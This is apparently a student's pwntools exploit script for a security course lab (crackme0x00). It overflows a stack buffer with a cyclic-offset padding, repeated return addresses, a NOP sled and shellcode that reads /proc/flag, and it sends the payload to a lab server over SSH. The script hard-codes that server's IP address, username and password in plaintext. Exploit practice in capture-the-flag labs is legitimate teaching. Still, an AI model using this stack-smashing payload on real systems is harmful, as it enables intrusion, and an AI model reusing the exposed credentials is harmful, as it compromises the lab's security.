#!/usr/bin/env python2

from pwn import *

context.terminal = ['tmux', 'splitw', '-v']
context.update(arch='i386', os='linux')

local_dbg = 0xffffcd50
local = local_dbg+0x100

server_dbg = 0xffffd550
server = server_dbg+0x100

start_addr = server_dbg

shellcode = shellcraft.cat("/proc/flag")
payload  = cyclic(cyclic_find(0x61616167))
for i in range (0, 1):
    payload += p32(server)
payload += "\x90"*2000
payload += asm(shellcode)
for i in range (0, 200):
    payload += p32(server)

# connect to our server
s = ssh("lab03", "52.201.10.159", password="b50e289f")# invoke a process in the server
p = s.process("./crackme0x00", cwd="/home/lab03/tut03-pwntool")

# Local
#p = process("./crackme0x00", cwd="/home/jakeholl/git/cs6265/lab03/tut03-pwntool")

# Local debug
#p = gdb.debug("./crackme0x00", ''' continue ''')

p.sendline(payload)
p.interactive()
